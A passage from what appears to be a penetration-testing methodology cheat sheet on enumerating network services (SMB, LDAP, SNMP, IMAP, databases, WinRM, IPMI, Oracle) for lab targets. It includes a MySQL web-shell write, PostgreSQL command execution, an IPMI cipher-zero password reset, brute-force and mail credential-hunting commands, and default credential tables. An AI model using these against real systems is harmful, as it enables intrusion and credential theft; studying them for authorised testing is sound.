ffuf -u http://<IP>/ -H "Host: FUZZ.<DOMAIN>" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac

# ffuf — word-count filter when size is dynamic (different timestamps, CSRF tokens)
ffuf -u http://<IP>/ -H "Host: FUZZ.<DOMAIN>" \
  -w wordlist.txt -fw <BASELINE_WORDCOUNT>

# gobuster vhost — --append-domain auto-appends the parent domain to each word
gobuster vhost -u http://<IP> --append-domain \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --domain <DOMAIN>

# wfuzz alternative
wfuzz -c -w wordlist.txt -H "Host: FUZZ.<DOMAIN>" --hl <BASELINE_LINES> http://<IP>/
```

**LOTL — raw curl loop (no fuzzers installed):**
```bash
BASELINE=$(curl -s -o /dev/null -w "%{size_download}" -H "Host: nope.<DOMAIN>" http://<IP>/)
while read -r sub; do
  size=$(curl -s -o /dev/null -w "%{size_download}" -H "Host: $sub.<DOMAIN>" http://<IP>/)
  [ "$size" != "$BASELINE" ] && echo "[+] $sub.<DOMAIN> (size=$size)"
done < /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

> Vhost → add to `/etc/hosts` (`<IP> <vhost>.<DOMAIN>`) before re-running directory enumeration; many apps refuse to render or generate broken links unless accessed by the correct hostname.

#### 3.5.2 SSL/TLS Certificate SAN Extraction (Live-cert vhost seed)

Multi-SAN certificates leak internal/staging vhost names that have no public DNS record. Pull names directly from the live cert on every TLS port, then feed each into `/etc/hosts` and re-run dir+vhost enum.

```bash
# openssl s_client + x509 — always available, target by IP
echo | openssl s_client -connect <TARGET>:443 -servername <TARGET> 2>/dev/null \
  | openssl x509 -noout -ext subjectAltName \
  | grep -oE 'DNS:[^,]+' | sed 's/DNS://g' | sort -u

# Subject CN too — some certs only set CN, no SAN
echo | openssl s_client -connect <TARGET>:443 -servername <TARGET> 2>/dev/null \
  | openssl x509 -noout -subject

# Full cert text dump for context (issuer, validity, EKU)
echo | openssl s_client -connect <TARGET>:443 -servername <TARGET> 2>/dev/null \
  | openssl x509 -noout -text
```

```bash
# nmap NSE — ssl-cert script across common TLS ports
nmap -p 443,8443,9443,4443 --script ssl-cert <TARGET>

# sslyze — structured cert info
sslyze --certinfo <TARGET>:443
```

```bash
# Sweep every open TCP port for a TLS cert (catches non-standard HTTPS)
for port in $(nmap -p- --open -sT <TARGET> -oG - | awk -F: '/Ports:/{print $2}' | tr ',' '\n' | grep -oE '[0-9]+/open/tcp' | cut -d/ -f1); do
  echo "=== :$port ==="
  echo | timeout 5 openssl s_client -connect <TARGET>:$port 2>/dev/null \
    | openssl x509 -noout -ext subjectAltName 2>/dev/null \
    | grep -oE 'DNS:[^,]+'
done
```

```bash
# Feed discovered SANs into /etc/hosts and re-run dir enum per vhost
for host in <DISCOVERED_VHOST_1> <DISCOVERED_VHOST_2>; do
  echo "<TARGET>  $host" | sudo tee -a /etc/hosts
  ffuf -u "https://${host}/FUZZ" \
    -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
    -k -mc 200,301,302,403
done
```

> **Tip:** Wildcard SANs (`*.<DOMAIN>`) confirm a wildcard cert — fuzz subdomains under that apex with `gobuster vhost --append-domain`. High-value SAN entries: `admin.`, `api-internal.`, `staging.`, `dev.`, `vpn.`, `mgmt.` — public DNS rarely exposes these, but the cert does.

> **OPSEC note:** `s_client` and `nmap --script ssl-cert` are passive TLS handshakes — no application-layer traffic, no log entries on the web app itself.

### 3.6 Kerberos (TCP 88)
```bash
# Confirm presence (indicates Domain Controller)
nmap -p 88 -Pn <IP>

# User enumeration via Kerberos (kerbrute userenum / passwordspray / bruteuser)
# Full coverage: see active-directory-methodology.md §1.3
# Quick recall: kerbrute userenum -d <DOMAIN> --dc <IP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# AS-REP Roasting (no creds needed) — full coverage in active-directory-methodology.md §1.4
# Quick recall: impacket-GetNPUsers <DOMAIN>/ -dc-ip <IP> -usersfile users.txt -request -format hashcat
```

### 3.7 POP3 / IMAP (TCP 110 / 143 / 993 / 995)
```bash
# Banner grab
nc -nv <TARGET> 110
nc -nv <TARGET> 143

# Capabilities
nmap -p 110,143,993,995 --script pop3-capabilities,imap-capabilities,ssl-cert -Pn <TARGET>
```

#### Raw IMAPS via openssl s_client (RFC 3501 tagged commands)
Each IMAP command must be prefixed with a unique tag (a, b, c, ...) — server responses echo the tag.
```bash
# Direct TLS on 993
openssl s_client -connect <TARGET>:993 -quiet

# STARTTLS upgrade on plaintext 143
openssl s_client -connect <TARGET>:143 -starttls imap -quiet

# Inside the session — login, enumerate ALL mailboxes, pivot
a LOGIN <USER> <PASSWORD>
b SELECT INBOX
c LIST "" *
c NAMESPACE

# Pivot to non-Inbox folders (where the real data lives) — IMAP requires unique tags per command
d1 SELECT Drafts
d2 SELECT Sent
d3 SELECT "Sent Items"
d4 SELECT Trash
d5 SELECT Junk
d6 SELECT Archive

# Enumerate messages in selected folder
e SEARCH ALL
f FETCH 1:* (FLAGS INTERNALDATE RFC822.SIZE ENVELOPE)

# Pull full body / headers / specific MIME part
g FETCH 1 BODY[]
g FETCH 1 BODY[TEXT]
g FETCH 1 BODY[HEADER]
h FETCH 1 BODY[2]

# Clean exit
z LOGOUT
```

> **Tip:** Inbox is often pruned on lab boxes — Drafts and Sent hold half-written secrets and historical context. Always `LIST "" *` before assuming a mailbox is empty.

#### Living-off-the-land alternative — curl IMAPS with custom commands
```bash
# Enumerate mailboxes
curl -k --user '<USER>:<PASSWORD>' 'imaps://<TARGET>/' -X 'LIST "" "*"'

# Fetch body of message 1 from a specific folder
curl -k --user '<USER>:<PASSWORD>' 'imaps://<TARGET>/Drafts' -X 'FETCH 1 BODY[TEXT]'
curl -k --user '<USER>:<PASSWORD>' 'imaps://<TARGET>/Drafts;UID=1'
```

#### POP3 (single Inbox, no folders)
```bash
# Plaintext
telnet <TARGET> 110
USER <USER>
PASS <PASSWORD>
LIST
RETR 1
QUIT

# POP3 over TLS
openssl s_client -connect <TARGET>:995 -quiet
USER <USER>
PASS <PASSWORD>
LIST
RETR 1
QUIT
```

#### 3.7.1 Offline PST / OST Mailbox Parsing (Credential Hunt)

PST files are commonly looted from anonymous FTP, open SMB shares (3.1, 3.8), or post-foothold user profile dirs (`%APPDATA%\Local\Microsoft\Outlook\*.ost`, `Documents\Outlook Files\*.pst`). Parse offline on the attacker box.

```bash
# Confirm filetype before parsing
file <FILE>.pst
# Expected: "Microsoft Outlook ... Personal Folders"

# Install libpst (provides readpst)
sudo apt install libpst-utils -y
```

```bash
# https://www.five-ten-sg.com/libpst/
# Convert PST -> mbox + .eml + decoded MIME attachments under <OUTDIR>/
# -t e   plain text email bodies
# -t a   include appointments
# -m     decode MIME attachments to disk
# -o     output directory (mirrors Outlook folder structure: Inbox, Sent, Drafts, Deleted Items)
readpst -tea -m -o pst_out/ <FILE>.pst

# Walk the extracted tree
ls -R pst_out/
```

```bash
# Cred-hunt grep across extracted mail
grep -RiE 'password|passwd|pwd|credential|login|secret|reset|temp.*pass|api.?key' pst_out/
grep -RiE 'password.*(is|has been|changed|reset|new)' pst_out/
grep -RiE '^(username|user|account|login)[: ]' pst_out/
grep -RiB2 -A2 'password.*(been|has).*changed' pst_out/

# Cred-share emails are most common in Sent/Drafts/Deleted - admins draft and never finish, or send + delete
grep -RiE 'password|credential' pst_out/Sent\ Items/ pst_out/Drafts/ pst_out/Deleted\ Items/ 2>/dev/null
```

```bash
# OST (offline cached Outlook profile) - readpst handles many OSTs directly
readpst -tea -m -o ost_out/ <FILE>.ost

# Fallback when readpst rejects the OST format
# Repo: https://github.com/libratom/libratom
pipx install libratom            # PEP 668 distros (Kali 2023+); else: pip install --user libratom
ratom emldump --out ost_out/ <FILE>.ost
```

```bash
# Structured triage — readpst → mbox → JSON for jq filtering
# readpst ships in Kali (libpst-tools); converts PST to mbox per folder
readpst -tea -m -o /tmp/pst_out <FILE>.pst
python3 -c '
import mailbox, json, os, sys
out=[]
for f in os.listdir("/tmp/pst_out"):
    p=os.path.join("/tmp/pst_out", f)
    if not os.path.isfile(p): continue
    for m in mailbox.mbox(p):
        out.append({"subject":m.get("Subject",""),"from":m.get("From",""),"to":m.get("To",""),"date":m.get("Date",""),"body":m.get_payload(decode=False) if isinstance(m.get_payload(),str) else ""})
print(json.dumps(out))
' > emails.json
jq '.[] | select(.body | test("password";"i")) | {subject, from, to, date, body}' emails.json
jq '.[] | select(.subject | test("password|credential|VPN|reset";"i"))' emails.json
```

```bash
# GUI review - import mbox files into Thunderbird via ImportExportTools NG
readpst -o pst_out -m <FILE>.pst
# Open Thunderbird -> Tools -> ImportExportTools NG -> Import mbox file -> pst_out/Inbox.mbox
```

> **Tip:** `Sent Items`, `Drafts`, and `Deleted Items` yield more creds than `Inbox` — admins draft cred-share emails and never finish, or send and immediately delete (still recoverable until purge).

> **Common findings:** vendor portal logins, VPN PSKs, helpdesk-issued temp passwords, scheduled-task service-account passwords mailed to teams, BitLocker recovery keys, AD password rotation announcements, IT onboarding emails with default credentials.

#### 3.7.2 Outlook .msg File Extraction (Standalone Compound Documents)

Individual `.msg` files are OLE2 compound documents exported from Outlook (drag-and-drop, right-click Save As, or extracted from forensic images). Unlike PST/OST archives that contain entire mailboxes, each `.msg` is a single message with embedded headers, body, and MIME attachments. Found on SMB shares, FTP drops, user Desktops, and ticketing-system exports.

```bash
# Confirm filetype
file <FILE>.msg
# Expected: "CDFV2 Microsoft Outlook Message" or "Composite Document File V2"
```

```bash
# msgconvert (libemail-outlook-message-perl) — converts .msg to RFC822 .eml
# Ships on Kali/Parrot; available via apt on Debian/Ubuntu
msgconvert <FILE>.msg
# Produces <FILE>.eml in the same directory — standard MIME, readable by any MUA/grep

# Batch convert all .msg files in a loot directory
find /tmp/loot/ -iname '*.msg' -exec msgconvert {} \;

# Cred-hunt across converted .eml files
grep -RiE 'password|passwd|pwd|credential|secret|api.?key|token' /tmp/loot/*.eml
grep -RiB2 -A2 'password.*(is|has been|changed|reset|new)' /tmp/loot/*.eml
```

```bash
# extract_msg (Python — if already installed on the pentest distro)
# CLI name varies by installer: try `extract_msg` first, fall back to `extract-msg`
# Extracts headers, body text, HTML body, and all attachments into a per-message folder
extract_msg <FILE>.msg     # OR: extract-msg <FILE>.msg  (depending on installer)
extract_msg <FILE>.msg -o /tmp/msg_out/

# Batch extraction
find /tmp/loot/ -iname '*.msg' -exec extract_msg {} -o /tmp/msg_out/ \;

# Grep extracted content
grep -RiE 'password|credential|secret' /tmp/msg_out/
```

```bash
# munpack (part of mpack — lightweight MIME unpacker)
# Works on .eml produced by msgconvert; extracts MIME attachments to current dir
munpack <FILE>.eml
# Attachments land as separate files — inspect for .xlsx, .docx, .pdf, .zip containing creds
```

#### Living-off-the-land / LOTL variant

```bash
# Pure bash/python3 OLE2 extraction without pip install
# Python3 olefile is part of the standard library on most pentest distros (ships with Pillow)
# If olefile is unavailable, use the stdlib-only approach below

# stdlib-only: dump raw OLE2 streams to disk using python3 zipfile-like access
python3 -c "
import olefile, sys, os
ole = olefile.OleFileIO(sys.argv[1])
outdir = sys.argv[1] + '_streams'
os.makedirs(outdir, exist_ok=True)
for stream in ole.listdir():
    name = '_'.join(stream)
    data = ole.openstream(stream).read()
    open(os.path.join(outdir, name), 'wb').write(data)
    if b'password' in data.lower() or b'credential' in data.lower():
        print(f'[!] Potential cred in stream: {name}')
ole.close()
" <FILE>.msg

# If olefile is NOT available — use strings + grep as a last resort
strings <FILE>.msg | grep -iE 'password|passwd|pwd|credential|secret|api.?key|From:|To:|Subject:'

# Windows LOTL — COM automation (Outlook must be installed)
powershell -c "
\$outlook = New-Object -ComObject Outlook.Application
\$msg = \$outlook.Session.OpenSharedItem((Resolve-Path '<FILE>.msg').Path)
Write-Output \"From: \$(\$msg.SenderEmailAddress)\"
Write-Output \"To: \$(\$msg.To)\"
Write-Output \"Subject: \$(\$msg.Subject)\"
Write-Output \"Body: \$(\$msg.Body)\"
\$msg.Attachments | ForEach-Object { \$_.SaveAsFile(\"C:\Windows\Temp\\\$(\$_.FileName)\"); Write-Output \"Attachment: \$(\$_.FileName)\" }
"
```

> **Tip:** `.msg` files on user Desktops and `Downloads` folders frequently contain password-reset confirmations, VPN enrollment instructions, or shared-credential handoffs that never made it into the PST archive (drag-and-dropped out of Outlook before archival).

### 3.8 SMB (TCP 139 / 445)
```bash
# Check null/guest session
netexec smb <IP> -u '' -p '' --shares
netexec smb <IP> -u 'guest' -p '' --shares

# Enumerate shares + permissions
smbmap -H <IP> -u '' -p ''
smbmap -H <IP> -u 'guest' -p ''
smbclient -L //<IP>/ -N

# Recursive share listing
smbmap -H <IP> -u '<USER>' -p '<PASSWORD>' -R

# Download entire share
smbclient //<IP>/<SHARE> -N -c 'recurse ON; prompt OFF; mget *'

# Enumerate users via RID brute-force
netexec smb <IP> -u '' -p '' --rid-brute 10000

# Check SMB signing
netexec smb <IP> --gen-relay-list relay.txt

# OS version, hostname, domain
netexec smb <IP> -u '' -p ''

# Nmap scripts
nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-os-discovery,smb-vuln-ms17-010,smb-vuln-ms08-067 -Pn <IP>

# Enumerate with enum4linux-ng
# https://github.com/cddmp/enum4linux-ng
enum4linux-ng -A <IP>
```

### 3.9 RPC / MSRPC (TCP 111 / 135)
```bash
# Linux RPC (portmapper)
rpcinfo -p <IP>

# Windows RPC — null session
rpcclient -U "" -N <IP>
# Useful commands inside rpcclient:
#   srvinfo              — server info
#   enumdomusers         — list users
#   enumdomgroups        — list groups
#   queryuser <RID>      — user details
#   querydispinfo        — detailed user info
#   querydominfo         — domain info (incl. password policy)
#   netshareenum         — list shares
#   lsaquery             — domain SID
#   lookupnames <USER>   — resolve name to SID
```

### 3.10 LDAP (TCP 389 / 636 / 3268 / 3269)
```bash
# Anonymous bind — naming contexts
ldapsearch -x -H ldap://<IP> -s base namingContexts

# Anonymous full dump
ldapsearch -x -H ldap://<IP> -b "DC=<DOMAIN>,DC=<TLD>" "(objectClass=*)"

# Search for users with descriptions (often contain hints/passwords)
ldapsearch -x -H ldap://<IP> -b "DC=<DOMAIN>,DC=<TLD>" "(&(objectClass=user)(description=*))" sAMAccountName description

# Authenticated dump
ldapsearch -x -H ldap://<IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' -b "DC=<DOMAIN>,DC=<TLD>" "(objectClass=user)" sAMAccountName

# ldapdomaindump (outputs HTML/JSON/grep files)
# https://github.com/dirkjanm/ldapdomaindump
ldapdomaindump -u '<DOMAIN>\<USER>' -p '<PASSWORD>' <IP>

# windapsearch
# https://github.com/ropnop/windapsearch
windapsearch -d <DOMAIN> --dc <IP> -u '<USER>@<DOMAIN>' -p '<PASSWORD>' --users --da --computers --groups
```

#### Living-off-the-land alternative — Windows-side `[adsisearcher]` / `dsquery` / `nltest` / `setspn`

No RSAT, no PowerView, no impacket — every modern Windows host can perform full LDAP recon against any reachable DC. Run from a domain-joined host or any process holding a Kerberos TGT (e.g. `runas /netonly`).

```powershell
# === [adsisearcher] — built-in PowerShell type accelerator (Win7+ / .NET) ===
# Domain users
([adsisearcher]"(&(objectCategory=user)(objectClass=user))").FindAll() | % { $_.Properties.samaccountname }

# Domain computers
([adsisearcher]"(objectCategory=computer)").FindAll() | % { $_.Properties.dnshostname }

# Group + members
([adsisearcher]"(&(objectCategory=group)(cn=Domain Admins))").FindOne().Properties.member

# OUs
([adsisearcher]"(objectCategory=organizationalUnit)").FindAll() | % { $_.Properties.distinguishedname }

# Kerberoastable users (SPN set, exclude krbtgt)
([adsisearcher]"(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt))").FindAll() |
  % { "$($_.Properties.samaccountname) :: $($_.Properties.serviceprincipalname -join ',')" }

# AS-REP roastable (UAC bit DONT_REQUIRE_PREAUTH = 0x400000)
([adsisearcher]"(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))").FindAll() |
  % { $_.Properties.samaccountname }

# Unconstrained delegation (UAC bit TRUSTED_FOR_DELEGATION = 0x80000)
([adsisearcher]"(userAccountControl:1.2.840.113556.1.4.803:=524288)").FindAll() |
  % { "$($_.Properties.samaccountname) :: $($_.Properties.dnshostname)" }

# Constrained delegation (msDS-AllowedToDelegateTo populated)
([adsisearcher]"(msDS-AllowedToDelegateTo=*)").FindAll() |
  % { "$($_.Properties.samaccountname) -> $($_.Properties.'msds-allowedtodelegateto')" }
```

```cmd
:: === net / nltest / setspn — always available, no RSAT ===
nltest /dclist:<DOMAIN>                 :: list all DCs
nltest /dsgetdc:<DOMAIN>                :: get current DC + site info
nltest /domain_trusts /all_trusts /v    :: every trust, transitive included

net user /domain                        :: all domain users
net user <USER> /domain                 :: specific user details
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
net accounts /domain                    :: password policy

setspn -T <DOMAIN> -Q */*               :: SPN dump (setspn requires RSAT on workstation,
                                        ::   present by default on DCs)
setspn -T * -Q */*                      :: forest-wide if multiple trusts

:: dsquery — REQUIRES RSAT / AD DS Tools (NOT default since Win8)
dsquery user -limit 0 domainroot
dsquery * -filter "(servicePrincipalName=*)" -attr sAMAccountName servicePrincipalName -limit 0
```

> RSAT AD module enumeration (`Get-ADUser`/`Get-ADComputer`/`Get-ADGroupMember`/SPN filter) — see [active-directory-methodology.md](active-directory-methodology.md) §2.4.

> **LOTL:** `[adsisearcher]` is the most universally-available primitive — no RSAT, no admin, no module imports. `dsquery` and `Get-AD*` only work where RSAT is installed.

### 3.11 SNMP (UDP 161)
```bash
# Community string brute-force
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt <IP>

# Walk the MIB tree
snmpwalk -v2c -c public <IP>

# Specific OIDs
snmpwalk -v2c -c public <IP> 1.3.6.1.4.1.77.1.2.25       # Windows usernames
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.4.2.1.2       # Running processes
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.6.3.1.2       # Installed software
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.6.13.1.3         # TCP listening ports
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.4.2.1.4       # Process binary paths (hrSWRunPath — args are at .5 below)
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.1                # System info

# hrSWRunParameters (.5) — argv of every running process — credentials-in-argv goldmine
# .4 is hrSWRunPath (binary path only); .5 is the actual command-line arguments
snmpwalk -v2c -c <COMMUNITY> <TARGET> 1.3.6.1.2.1.25.4.2.1.5

# Pair .4 (path) and .5 (args) so you can match leaked args back to the binary
snmpwalk -v2c -c <COMMUNITY> <TARGET> 1.3.6.1.2.1.25.4.2.1.4   # hrSWRunPath
snmpwalk -v2c -c <COMMUNITY> <TARGET> 1.3.6.1.2.1.25.4.2.1.5   # hrSWRunParameters

# Grep .5 output for likely creds — user:pass, --pass=, -p<pw>, env-style
snmpwalk -v2c -c <COMMUNITY> <TARGET> 1.3.6.1.2.1.25.4.2.1.5 \
  | grep -iE 'pass|secret|token|key|user:|--p|-p |PGPASSWORD|MYSQL_PWD'

# SNMPv1 fallback — some appliances/printers only respond to v1
snmpwalk -v1 -c <COMMUNITY> <TARGET> 1.3.6.1.2.1.25.4.2.1.5

# Full hrSWRun table walk — status, name, path, params — one host
for oid in 1.3.6.1.2.1.25.4.2.1.2 1.3.6.1.2.1.25.4.2.1.4 1.3.6.1.2.1.25.4.2.1.5; do
  echo "=== $oid ==="
  snmpwalk -v2c -c <COMMUNITY> <TARGET> $oid
done
```

> **Tip:** Anything started with `mysql -u root -p<PASSWORD>`, `--auth <USER>:<PASSWORD>`, `python -m http.server <PORT> --basic-auth <USER>:<PASSWORD>`, or env-prefixed like `PGPASSWORD=<PASSWORD> psql ...` leaks verbatim through `.5`. Always pull `.5` even if `.2`/`.4` look boring — printers, monitoring agents, and crusty Linux boxes are the highest-yield targets.

```bash
# SNMPv3 enumeration
snmpwalk -v3 -u <USER> -l authPriv -a SHA -A '<AUTH_PASS>' -x AES -X '<PRIV_PASS>' <IP>

# Nmap scripts
nmap -sU -p 161 --script snmp-info,snmp-brute,snmp-netstat,snmp-processes,snmp-interfaces -Pn <IP>
```

### 3.12 NFS (TCP/UDP 2049)
```bash
# Show exports
showmount -e <IP>

# Mount share
mkdir /tmp/nfs
sudo mount -t nfs <IP>:/<SHARE> /tmp/nfs -o nolock

# Nmap scripts
nmap -p 2049 --script nfs-ls,nfs-showmount,nfs-statfs -Pn <IP>

# Check for no_root_squash in exports (privesc vector)
```

### 3.13 MSSQL (TCP 1433)
```bash
# Auth check
netexec mssql <IP> -u '<USER>' -p '<PASSWORD>'

# Nmap scripts — banner / NTLM info / empty-password / brute
nmap -p 1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-brute,ms-sql-empty-password -Pn <IP>
```

> Connection commands, enumeration SQL, and the post-foothold attack steps live in 3.13.1 Full Attack Chain below.

#### 3.13.1 Full Attack Chain

> Full MSSQL attack chain (post-foothold exploitation): [attacking-common-applications.md § Phase 14v: Microsoft SQL Server (TCP 1433)](attacking-common-applications.md#phase-14v-microsoft-sql-server-tcp-1433).

### 3.14 MySQL / MariaDB (TCP 3306)
```bash
# Login
mysql -h <IP> -u root -p
mysql -h <IP> -u root --password=''
mysql -h <IP> -u root -p'<PASSWORD>'

# Useful commands:
# SHOW DATABASES;
# USE <DB>; SHOW TABLES;
# SELECT * FROM <TABLE>;
# SELECT LOAD_FILE('/etc/passwd');
# SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

# Nmap scripts
nmap -p 3306 --script mysql-info,mysql-enum,mysql-empty-password,mysql-brute -Pn <IP>
```

### 3.15 RDP (TCP 3389)
```bash
# Check if accessible
nmap -p 3389 --script rdp-ntlm-info -Pn <IP>

# Connect
xfreerdp /v:<IP> /u:'<USER>' /p:'<PASSWORD>' /cert:ignore +clipboard /dynamic-resolution

# Brute-force
hydra -L users.txt -P passwords.txt rdp://<IP> -t 4
netexec rdp <IP> -u users.txt -p passwords.txt
```

### 3.16 WinRM (TCP 5985 / 5986)
```bash
# Check access
netexec winrm <IP> -u '<USER>' -p '<PASSWORD>'

# Connect
evil-winrm -i <IP> -u '<USER>' -p '<PASSWORD>'
evil-winrm -i <IP> -u '<USER>' -H '<NT_HASH>'
```

#### Living-off-the-land alternative — native Windows WinRM clients

When on a Windows foothold (no evil-winrm, no impacket).

```cmd
:: cmd.exe — winrs (one-shot remote command, NTLM/Kerberos)
winrs -r:<TARGET> -u:<DOMAIN>\<USER> -p:<PASSWORD> "whoami /all"
winrs -r:<TARGET> -u:<DOMAIN>\<USER> -p:<PASSWORD> cmd.exe       :: interactive

:: HTTPS (5986) — avoids TrustedHosts requirement when cert is valid
winrs -r:https://<TARGET>:5986 -u:<DOMAIN>\<USER> -p:<PASSWORD> hostname
```

```powershell
# PowerShell — interactive PSSession
Enter-PSSession -ComputerName <TARGET> -Credential (Get-Credential)

# Single command / script block
$cred = New-Object PSCredential('<DOMAIN>\<USER>',(ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force))
Invoke-Command -ComputerName <TARGET> -Credential $cred -ScriptBlock { hostname; whoami /priv }

# Persistent session (re-use across multiple commands, supports Copy-Item -ToSession/-FromSession)
$s = New-PSSession -ComputerName <TARGET> -Credential $cred
Invoke-Command -Session $s -ScriptBlock { Get-Process }
Remove-PSSession $s

# Cross-domain / non-domain-joined target — TrustedHosts required for NTLM
Set-Item WSMan:\localhost\Client\TrustedHosts -Value '*' -Force
# Or use HTTPS (5986) instead — avoids TrustedHosts when cert validates
```

> **WinRM defaults:** HTTP/5985, HTTPS/5986. Enabled by default on Server 2012+, disabled on workstations. Membership in `Remote Management Users` or local Administrators required.

### 3.17 Redis (TCP 6379)
```bash
# Unauthenticated access
redis-cli -h <IP>
# INFO, KEYS *, CONFIG GET dir, CONFIG GET dbfilename

# Authenticated
redis-cli -h <IP> -a '<PASSWORD>'

# Nmap scripts
nmap -p 6379 --script redis-info -Pn <IP>
```

### 3.18 rsync (TCP 873)
```bash
# List modules
rsync --list-only rsync://<IP>/

# Download all files from module
rsync -av rsync://<IP>/<MODULE>/ /tmp/rsync_loot/
```

### 3.19 IPMI (UDP 623)
```bash
# Check for IPMI
nmap -sU -p 623 --script ipmi-version -Pn <IP>

# Dump hash (IPMI 2.0 RAKP auth bypass — no password needed)
ipmitool -I lanplus -H <IP> -U '' -P '' user list
msf> use auxiliary/scanner/ipmi/ipmi_dumphashes

# Default credentials: ADMIN:ADMIN, admin:admin, root:root

# Crack IPMI hashes (RAKP HMAC-SHA1)
hashcat -m 7300 ipmi_hashes.txt /usr/share/wordlists/rockyou.txt
```

#### 3.19.1 IPMI Deep Dive (Cipher Zero, Anonymous, Default Creds)

IPMI exposes baseboard-management-controller (BMC) functionality — powering hosts on/off, mounting virtual media, console access. Three classic vulns: **Cipher Zero** (auth bypass with cipher suite 0), **anonymous null user**, and **RAKP hash retrieval** before authentication.

```bash
# Quick triage — fingerprint + cipher 0 detection in one nmap call
nmap -sU -p 623 --script ipmi-cipher-zero,ipmi-version -Pn <IP>

# Metasploit — cipher zero check
msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_cipher_zero; set RHOSTS <IP>; run; exit"

# Metasploit — dump RAKP HMAC-SHA1 hashes for offline cracking (-m 7300 in hashcat)
msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <IP>; set OUTPUT_HASHCAT_FILE ipmi.hashes; run; exit"
hashcat -m 7300 ipmi.hashes /usr/share/wordlists/rockyou.txt

# ipmitool — cipher 0 exploitation (set password without authenticating)
ipmitool -I lanplus -C 0 -H <IP> -U Administrator -P '' user list
ipmitool -I lanplus -C 0 -H <IP> -U Administrator -P '' user set password 2 'NewP@ss'

# ipmitool — anonymous (null) user enumeration
ipmitool -I lanplus -H <IP> -U '' -P '' user list
ipmitool -I lanplus -H <IP> -U admin -P admin user list

# ipmitool — once authenticated, escalate to a chassis console
ipmitool -I lanplus -H <IP> -U <USER> -P <PASSWORD> sol activate     # Serial-Over-LAN console
ipmitool -I lanplus -H <IP> -U <USER> -P <PASSWORD> chassis power status
ipmitool -I lanplus -H <IP> -U <USER> -P <PASSWORD> chassis bootdev pxe   # force PXE boot for OS-level pivot
```

**Common default credentials by vendor:**

| Vendor | Default user / password |
|---|---|
| Dell iDRAC | `root` / `calvin` |
| HP iLO | `Administrator` / 8-char random on label, often left default |
| Supermicro | `ADMIN` / `ADMIN` |
| IBM IMM2 | `USERID` / `PASSW0RD` (zero, not O) |
| Generic | `admin/admin`, `root/root`, `admin/password` |

### 3.20 VNC (TCP 5900-5910)
```bash
# Banner / info
nmap -p 5900 --script vnc-info -Pn <IP>

# Brute-force
hydra -P passwords.txt vnc://<IP>
nmap -p 5900 --script vnc-brute -Pn <IP>

# Connect
vncviewer <IP>
```

### 3.21 Finger (TCP 79)
```bash
# Enumerate users
finger @<IP>
finger <USER>@<IP>
finger-user-enum.pl -U users.txt -t <IP>
```

### 3.22 PostgreSQL (TCP 5432)
```bash
# Connect
psql -h <IP> -U postgres
psql -h <IP> -U postgres -d <DATABASE>

# Default credentials: postgres:postgres, postgres:<blank>

# Useful SQL commands:
# \l                        — list databases
# \c <DATABASE>             — connect to database
# \dt                       — list tables
# \du                       — list users/roles
# SELECT * FROM <TABLE>;
# SELECT pg_read_file('/etc/passwd');   — read files (superuser)
# COPY (SELECT '') TO PROGRAM 'id';    — command execution (superuser)

# RCE via COPY TO PROGRAM (if superuser):
# CREATE TABLE cmd_exec(cmd_output text);
# COPY cmd_exec FROM PROGRAM 'id';
# SELECT * FROM cmd_exec;

# File read via lo_import:
# SELECT lo_import('/etc/passwd');
# SELECT lo_get(<OID>);

# Nmap scripts
nmap -p 5432 --script pgsql-brute -Pn <IP>

# Brute-force
hydra -L users.txt -P passwords.txt postgres://<IP>
```

#### PostgreSQL Large Object (LO) read/write primitive — superuser

> Full PostgreSQL attack chain (post-foothold exploitation): [attacking-common-applications.md § Phase 14s: PostgreSQL — Post-Auth File R/W & RCE Primitives](attacking-common-applications.md#phase-14s-postgresql--post-auth-file-rw--rce-primitives).

### 3.23 Oracle TNS (TCP 1521)

Oracle Transparent Network Substrate (TNS) is the communication protocol for Oracle databases. The TNS Listener (default port 1521) handles incoming connections and routes them to the correct database instance (SID/Service Name).

#### TNS Listener Enumeration

```bash
# Banner grab — version and OS information
nmap -p 1521 -sV -Pn <IP>

# TNS Listener status (reveals SIDs, service names, OS info)
# tnscmd10g — legacy but still effective
tnscmd10g status -h <IP>
tnscmd10g version -h <IP>
tnscmd10g services -h <IP>

# lsnrctl (Oracle client — if installed)
lsnrctl status <IP>

# Nmap NSE scripts
nmap -p 1521 --script oracle-tns-version -Pn <IP>
nmap -p 1521 --script oracle-enum-users --script-args oracle-enum-users.sid=<SID> -Pn <IP>
```

#### SID / Service Name Discovery

```bash
# SID guessing with odat
odat sidguesser -s <IP>
odat sidguesser -s <IP> -p 1521

# SID brute-force with nmap
nmap -p 1521 --script oracle-sid-brute -Pn <IP>
nmap -p 1521 --script oracle-sid-brute --script-args oraclesids=/usr/share/metasploit-framework/data/wordlists/sid.txt -Pn <IP>

# Hydra SID brute (uses tns module)
hydra -L /usr/share/metasploit-framework/data/wordlists/sid.txt -s 1521 <IP> oracle-sid

# Metasploit
msf6 > use auxiliary/scanner/oracle/sid_brute
msf6 > set RHOSTS <IP>
msf6 > run

# Common SIDs: XE, ORCL, ORCLCDB, XEXDB, ORCLPDB1, PDBORCL
```

#### Default Credentials

```text
scott:tiger                     # Classic demo account (since Oracle 7)
sys:change_on_install           # SYS default (DBA role)
